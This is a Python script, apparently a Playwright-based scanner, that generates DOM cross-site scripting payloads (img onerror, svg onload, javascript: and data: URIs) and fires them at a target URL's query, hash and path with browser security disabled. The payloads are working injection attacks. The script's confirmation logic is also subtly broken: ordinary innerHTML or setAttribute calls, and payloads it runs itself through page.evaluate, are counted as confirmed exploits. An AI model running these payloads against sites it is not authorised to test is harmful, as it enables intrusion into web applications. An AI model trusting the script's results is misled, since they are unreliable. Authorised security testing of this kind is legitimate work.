#!/usr/bin/env python3

import asyncio
import re
import sys
import json
import hashlib
import base64
import time
from urllib.parse import quote, urljoin, urlparse, parse_qs
from typing import List, Dict, Optional, Set, Tuple
from datetime import datetime
from dataclasses import dataclass, asdict
from pathlib import Path
import logging

from playwright.async_api import async_playwright

@dataclass
class POCResult:
    url: str
    sink: str
    payload: str
    execution_confirmed: bool
    execution_method: str
    response_time: float
    dom_changes: Dict
    console_logs: List[str]
    network_requests: List[str]
    screenshot_path: Optional[str]
    timestamp: str

class PlaywrightDOMPOCFramework:
    """
    Playwright-based framework for generating and testing DOM XSS proof-of-concepts
    Focuses on document.write, innerHTML, and setAttribute triggers
    """
    
    def __init__(self, headless: bool = True, timeout: int = 30000, take_screenshots: bool = True):
        self.headless = headless
        self.timeout = timeout
        self.take_screenshots = take_screenshots
        self.results = []
        self.console_logs = []
        self.network_requests = []
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        
    async def setup_browser_monitoring(self, page):
        """Setup comprehensive browser monitoring for PoC detection"""
        
        # Monitor console logs
        self.console_logs = []
        async def log_console(msg):
            self.console_logs.append({
                'type': msg.type,
                'text': msg.text,
                'timestamp': datetime.now().isoformat()
            })
        page.on('console', log_console)
        
        # Monitor network requests
        self.network_requests = []
        async def log_request(request):
            self.network_requests.append({
                'url': request.url,
                'method': request.method,
                'headers': dict(request.headers),
                'timestamp': datetime.now().isoformat()
            })
        page.on('request', log_request)
        
        # Monitor JavaScript errors
        async def log_error(error):
            self.console_logs.append({
                'type': 'error',
                'text': str(error),
                'timestamp': datetime.now().isoformat()
            })
        page.on('pageerror', log_error)
        
        # Setup DOM monitoring
        await page.add_init_script("""
        window.pocDetection = {
            domChanges: [],
            sinkCalls: [],
            executedPayloads: [],
            
            // Monitor DOM changes
            setupMutationObserver: function() {
                const observer = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        if (mutation.type === 'childList') {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeType === 1) {
                                    const content = node.innerHTML || node.outerHTML || '';
                                    if (content.includes('<script') || 
                                        content.includes('javascript:') || 
                                        content.includes('onerror=') ||
                                        content.includes('onload=') ||
                                        content.includes('alert(') ||
                                        content.includes('confirm(') ||
                                        content.includes('prompt(')) {
                                        window.pocDetection.domChanges.push({
                                            type: 'dangerous_content_added',
                                            content: content.substring(0, 500),
                                            tagName: node.tagName,
                                            timestamp: Date.now()
                                        });
                                        
                                        // Mark as executed if it's a script
                                        if (content.includes('<script') || content.includes('javascript:')) {
                                            window.pocDetection.executedPayloads.push({
                                                content: content.substring(0, 200),
                                                method: 'dom_insertion',
                                                timestamp: Date.now()
                                            });
                                        }
                                    }
                                }
                            });
                        }
                        
                        if (mutation.type === 'attributes') {
                            const attrValue = mutation.target.getAttribute(mutation.attributeName);
                            if (attrValue && (
                                attrValue.includes('javascript:') ||
                                attrValue.includes('<script') ||
                                attrValue.includes('alert(') ||
                                mutation.attributeName.startsWith('on')
                            )) {
                                window.pocDetection.domChanges.push({
                                    type: 'dangerous_attribute_set',
                                    attribute: mutation.attributeName,
                                    value: attrValue.substring(0, 200),
                                    element: mutation.target.tagName,
                                    timestamp: Date.now()
                                });
                                
                                if (attrValue.includes('alert(') || attrValue.includes('javascript:')) {
                                    window.pocDetection.executedPayloads.push({
                                        content: attrValue.substring(0, 200),
                                        method: 'attribute_set',
                                        attribute: mutation.attributeName,
                                        timestamp: Date.now()
                                    });
                                }
                            }
                        }
                    });
                });
                
                observer.observe(document.body || document.documentElement, {
                    childList: true,
                    subtree: true,
                    attributes: true,
                    attributeOldValue: true
                });
                
                return observer;
            },
            
            // Hook dangerous sink functions
            hookSinks: function() {
                // Hook innerHTML
                const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
                if (originalInnerHTMLDescriptor) {
                    Object.defineProperty(Element.prototype, 'innerHTML', {
                        set: function(value) {
                            window.pocDetection.sinkCalls.push({
                                sink: 'innerHTML',
                                value: value.substring(0, 500),
                                element: this.tagName,
                                timestamp: Date.now()
                            });
                            
                            // Check for dangerous content
                            if (value && (value.includes('<script') || 
                                        value.includes('javascript:') || 
                                        value.includes('onerror=') ||
                                        value.includes('onload=') ||
                                        value.includes('alert('))) {
                                window.pocDetection.executedPayloads.push({
                                    content: value.substring(0, 200),
                                    method: 'innerHTML',
                                    element: this.tagName,
                                    timestamp: Date.now()
                                });
                            }
                            
                            return originalInnerHTMLDescriptor.set.call(this, value);
                        },
                        get: originalInnerHTMLDescriptor.get,
                        configurable: true
                    });
                }
                
                // Hook document.write
                const originalDocumentWrite = document.write;
                document.write = function(content) {
                    window.pocDetection.sinkCalls.push({
                        sink: 'document.write',
                        value: content.substring(0, 500),
                        timestamp: Date.now()
                    });
                    
                    if (content && (content.includes('<script') || 
                                  content.includes('javascript:') || 
                                  content.includes('onerror=') ||
                                  content.includes('alert('))) {
                        window.pocDetection.executedPayloads.push({
                            content: content.substring(0, 200),
                            method: 'document.write',
                            timestamp: Date.now()
                        });
                    }
                    
                    return originalDocumentWrite.call(this, content);
                };
                
                // Hook setAttribute
                const originalSetAttribute = Element.prototype.setAttribute;
                Element.prototype.setAttribute = function(name, value) {
                    window.pocDetection.sinkCalls.push({
                        sink: 'setAttribute',
                        attribute: name,
                        value: value ? value.substring(0, 200) : '',
                        element: this.tagName,
                        timestamp: Date.now()
                    });
                    
                    if (value && (value.includes('javascript:') || 
                                value.includes('<script') ||
                                value.includes('alert(') ||
                                name.startsWith('on'))) {
                        window.pocDetection.executedPayloads.push({
                            content: value.substring(0, 200),
                            method: 'setAttribute',
                            attribute: name,
                            element: this.tagName,
                            timestamp: Date.now()
                        });
                    }
                    
                    return originalSetAttribute.call(this, name, value);
                };
                
                // Hook eval
                const originalEval = window.eval;
                window.eval = function(code) {
                    window.pocDetection.sinkCalls.push({
                        sink: 'eval',
                        value: code.substring(0, 500),
                        timestamp: Date.now()
                    });
                    
                    window.pocDetection.executedPayloads.push({
                        content: code.substring(0, 200),
                        method: 'eval',
                        timestamp: Date.now()
                    });
                    
                    return originalEval.call(this, code);
                };
                
                // Hook setTimeout with string
                const originalSetTimeout = window.setTimeout;
                window.setTimeout = function(code, delay) {
                    if (typeof code === 'string') {
                        window.pocDetection.sinkCalls.push({
                            sink: 'setTimeout',
                            value: code.substring(0, 500),
                            delay: delay,
                            timestamp: Date.now()
                        });
                        
                        window.pocDetection.executedPayloads.push({
                            content: code.substring(0, 200),
                            method: 'setTimeout',
                            delay: delay,
                            timestamp: Date.now()
                        });
                    }
                    
                    return originalSetTimeout.call(this, code, delay);
                };
            },
            
            // Get detection results
            getResults: function() {
                return {
                    domChanges: this.domChanges,
                    sinkCalls: this.sinkCalls,
                    executedPayloads: this.executedPayloads,
                    totalDetections: this.domChanges.length + this.sinkCalls.length + this.executedPayloads.length
                };
            }
        };
        
        // Initialize monitoring
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                window.pocDetection.setupMutationObserver();
                window.pocDetection.hookSinks();
            });
        } else {
            window.pocDetection.setupMutationObserver();
            window.pocDetection.hookSinks();
        }
        """)
    
    async def generate_sink_specific_poc(self, sink_type: str, base_payload: str) -> List[str]:
        """Generate PoC payloads specific to sink types"""
        
        sink_payloads = {
            'innerHTML': [
                f"<img src=x onerror='{base_payload}'>",
                f"<svg onload='{base_payload}'>",
                f"<iframe srcdoc='<script>{base_payload}</script>'>",
                f"<object data='data:text/html,<script>{base_payload}</script>'></object>",
                f"<embed src='data:text/html,<script>{base_payload}</script>'>",
                f"<details open ontoggle='{base_payload}'>",
                f"<marquee onstart='{base_payload}'>",
                f"<video><source onerror='{base_payload}'></video>"
            ],
            'document.write': [
                f"<script>{base_payload}</script>",
                f"<img src=x onerror='{base_payload}'>",
                f"<svg onload='{base_payload}'>",
                f"<iframe src='javascript:{base_payload}'></iframe>",
                f"<object data='javascript:{base_payload}'></object>",
                f"<embed src='javascript:{base_payload}'>",
                f"<form action='javascript:{base_payload}'><input type=submit></form>",
                f"<meta http-equiv=refresh content='0;url=javascript:{base_payload}'>"
            ],
            'setAttribute': [
                f"javascript:{base_payload}",
                f"data:text/html,<script>{base_payload}</script>",
                f"vbscript:{base_payload}",
                f"javascript:void({base_payload})",
                f"javascript://comment%0a{base_payload}",
                f"data:text/html;base64,{base64.b64encode(f'<script>{base_payload}</script>'.encode()).decode()}"
            ]
        }
        
        return sink_payloads.get(sink_type, [f"<script>{base_payload}</script>"])
    
    async def test_payload_execution(self, url: str, sink_type: str, payload: str, 
                                   injection_point: str = 'param') -> Optional[POCResult]:
        """Test a specific payload for execution confirmation"""
        
        if not url or not payload:
            logging.warning("Invalid URL or payload provided")
            return None
        
        start_time = time.time()
        browser = None
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=self.headless,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--disable-gpu' if self.headless else '',
                        '--disable-software-rasterizer'
                    ]
                )
                
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    viewport={"width": 1920, "height": 1080},
                    ignore_https_errors=True
                )
                
                page = await context.new_page()
                
                # Setup monitoring
                await self.setup_browser_monitoring(page)
                
                # Create test URL with payload
                if injection_point == 'param':
                    test_url = f"{url}{'&' if '?' in url else '?'}test={quote(payload)}"
                elif injection_point == 'hash':
                    test_url = f"{url}#{quote(payload)}"
                elif injection_point == 'path':
                    parsed = urlparse(url)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}/{quote(payload)}"
                else:
                    test_url = f"{url}{'&' if '?' in url else '?'}test={quote(payload)}"
                
                # Navigate to test URL
                await page.goto(test_url, timeout=self.timeout, wait_until="domcontentloaded")
                
                # Wait for potential execution
                await page.wait_for_timeout(3000)
                
                # Get monitoring results
                detection_results = await page.evaluate("window.pocDetection ? window.pocDetection.getResults() : {}")
                
                # Check for execution confirmation
                execution_confirmed = False
                execution_method = "none"
                
                if detection_results.get('executedPayloads'):
                    execution_confirmed = True
                    execution_method = "payload_execution_detected"
                elif detection_results.get('sinkCalls'):
                    execution_confirmed = True
                    execution_method = "sink_call_detected"
                elif detection_results.get('domChanges'):
                    execution_confirmed = True
                    execution_method = "dom_mutation_detected"
                
                # Additional checks for specific alert/confirm/prompt patterns
                if not execution_confirmed:
                    # Check if payload contains alert/confirm/prompt and look for dialogs
                    if any(func in payload.lower() for func in ['alert(', 'confirm(', 'prompt(']):
                        # Try to detect if a dialog would have been shown
                        page.on('dialog', lambda dialog: dialog.dismiss())
                        try:
                            await page.evaluate(f"({payload.replace('alert(', 'window.alert(').replace('confirm(', 'window.confirm(').replace('prompt(', 'window.prompt(')})")
                            execution_confirmed = True
                            execution_method = "dialog_function_executed"
                        except Exception:
                            pass
                
                # Take screenshot if execution confirmed
                screenshot_path = None
                if execution_confirmed and self.take_screenshots:
                    screenshot_dir = Path("poc_screenshots")
                    screenshot_dir.mkdir(exist_ok=True)
                    screenshot_path = screenshot_dir / f"poc_{hashlib.md5(test_url.encode()).hexdigest()[:8]}.png"
                    await page.screenshot(path=str(screenshot_path))
                
                response_time = time.time() - start_time
                
                result = POCResult(
                    url=test_url,
                    sink=sink_type,
                    payload=payload,
                    execution_confirmed=execution_confirmed,
                    execution_method=execution_method,
                    response_time=response_time,
                    dom_changes=detection_results,
                    console_logs=self.console_logs.copy(),
                    network_requests=self.network_requests.copy(),
                    screenshot_path=str(screenshot_path) if screenshot_path else None,
                    timestamp=datetime.now().isoformat()
                )
                
                if execution_confirmed:
                    print(f"[+] PoC CONFIRMED - {sink_type} - {test_url}")
                    print(f"    Method: {execution_method}")
                    print(f"    Payload: {payload[:100]}...")
                    if screenshot_path:
                        print(f"    Screenshot: {screenshot_path}")
                
                return result
                
        except Exception as e:
            print(f"[-] Error testing PoC {url}: {str(e)}")
            logging.error(f"PoC test error for {url}: {e}")
        finally:
            # Ensure browser is closed
            if browser:
                try:
                    await browser.close()
                except Exception as e:
                    logging.debug(f"Error closing browser: {e}")
        
        return None
    
    async def comprehensive_poc_test(self, url: str, detected_sinks: List[str]) -> List[POCResult]:
        """Run comprehensive PoC testing based on detected sinks"""
        
        results = []
        base_payloads = [
            "alert('DOM_XSS_POC')",
            "confirm('DOM_XSS_CONFIRMED')",
            "prompt('DOM_XSS_PROMPT')",
            "console.log('DOM_XSS_CONSOLE')",
            "document.title='DOM_XSS_TITLE'",
            "window.name='DOM_XSS_NAME'"
        ]
        
        injection_points = ['param', 'hash', 'path']
        
        for sink in detected_sinks:
            print(f"[*] Testing PoCs for sink: {sink}")
            
            for base_payload in base_payloads:
                # Generate sink-specific payloads
                sink_payloads = await self.generate_sink_specific_poc(sink, base_payload)
                
                for payload in sink_payloads[:3]:  # Test first 3 payloads per sink
                    for injection_point in injection_points:
                        result = await self.test_payload_execution(url, sink, payload, injection_point)
                        if result:
                            results.append(result)
                            
                            # If we found a working payload, test a few more variations
                            if result.execution_confirmed:
                                print(f"[!] Found working PoC, testing variations...")
                                # Test additional payloads for this working combination
                                for extra_payload in sink_payloads[3:6]:  # Test next 3
                                    extra_result = await self.test_payload_execution(url, sink, extra_payload, injection_point)
                                    if extra_result:
                                        results.append(extra_result)
                                break  # Move to next sink if we found working payload
                        
                        # Rate limiting
                        await asyncio.sleep(0.5)
        
        return results
    
    def generate_poc_report(self, results: List[POCResult], output_file: str = "dom_poc_results.json") -> Dict:
        """Generate comprehensive PoC testing report"""
        
        successful_pocs = [r for r in results if r.execution_confirmed]
        failed_pocs = [r for r in results if not r.execution_confirmed]
        
        # Group by execution method
        execution_methods = {}
        for result in successful_pocs:
            method = result.execution_method
            if method not in execution_methods:
                execution_methods[method] = []
            execution_methods[method].append(result)
        
        # Group by sink type
        sink_success = {}
        for result in successful_pocs:
            sink = result.sink
            if sink not in sink_success:
                sink_success[sink] = []
            sink_success[sink].append(result)
        
        report = {
            "poc_test_info": {
                "timestamp": datetime.now().isoformat(),
                "total_tests": len(results),
                "successful_pocs": len(successful_pocs),
                "failed_pocs": len(failed_pocs),
                "success_rate": round(len(successful_pocs) / len(results) * 100, 2) if results else 0,
                "framework": "Playwright DOM PoC Framework v1.0"
            },
            "execution_methods": {
                method: len(pocs) for method, pocs in execution_methods.items()
            },
            "sink_analysis": {
                sink: {
                    "successful_pocs": len(pocs),
                    "average_response_time": round(sum(p.response_time for p in pocs) / len(pocs), 3),
                    "payloads": list(set(p.payload[:100] for p in pocs))
                }
                for sink, pocs in sink_success.items()
            },
            "detailed_results": [asdict(result) for result in results],
            "working_payloads": [
                {
                    "url": r.url,
                    "sink": r.sink,
                    "payload": r.payload,
                    "method": r.execution_method,
                    "screenshot": r.screenshot_path
                }
                for r in successful_pocs
            ],
            "recommendations": {
                "immediate_fix_required": [r.url for r in successful_pocs],
                "payloads_to_test_manually": list(set(r.payload for r in successful_pocs)),
                "vulnerable_sinks": list(set(r.sink for r in successful_pocs))
            }
        }
        
        # Save report
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate summary
        print(f"\n[✓] PoC Testing Summary:")
        print(f"    - Total tests: {len(results)}")
        print(f"    - Successful PoCs: {len(successful_pocs)}")
        print(f"    - Failed tests: {len(failed_pocs)}")
        print(f"    - Success rate: {report['poc_test_info']['success_rate']}%")
        print(f"    - Vulnerable sinks: {len(sink_success)}")
        print(f"    - Screenshots taken: {len([r for r in successful_pocs if r.screenshot_path])}")
        print(f"    - Report saved: {output_file}")
        
        if successful_pocs:
            print(f"\n[!] CRITICAL: {len(successful_pocs)} working PoCs found!")
            print(f"    Working sinks: {', '.join(sink_success.keys())}")
            print(f"    Review detailed results in: {output_file}")
        
        return report

async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Playwright DOM XSS PoC Framework")
    parser.add_argument("url", help="URL to test")
    parser.add_argument("--sinks", nargs='+', 
                       default=['innerHTML', 'document.write', 'setAttribute'],
                       help="DOM sinks to test (default: innerHTML document.write setAttribute)")
    parser.add_argument("-o", "--output", default="dom_poc_results.json",
                       help="Output file for results")
    parser.add_argument("--visible", action="store_true",
                       help="Run browser in visible mode")
    parser.add_argument("--no-screenshots", action="store_true",
                       help="Disable screenshot capture")
    parser.add_argument("--timeout", type=int, default=30000,
                       help="Timeout for page loads in milliseconds")
    
    args = parser.parse_args()
    
    print(f"[*] Starting Playwright DOM PoC Framework")
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Testing sinks: {', '.join(args.sinks)}")
    print(f"[*] Screenshots: {'Disabled' if args.no_screenshots else 'Enabled'}")
    
    # Initialize framework
    framework = PlaywrightDOMPOCFramework(
        headless=not args.visible,
        timeout=args.timeout,
        take_screenshots=not args.no_screenshots
    )
    
    # Run comprehensive PoC testing
    results = await framework.comprehensive_poc_test(args.url, args.sinks)
    
    # Generate report
    framework.generate_poc_report(results, args.output)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] PoC testing interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
        logging.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)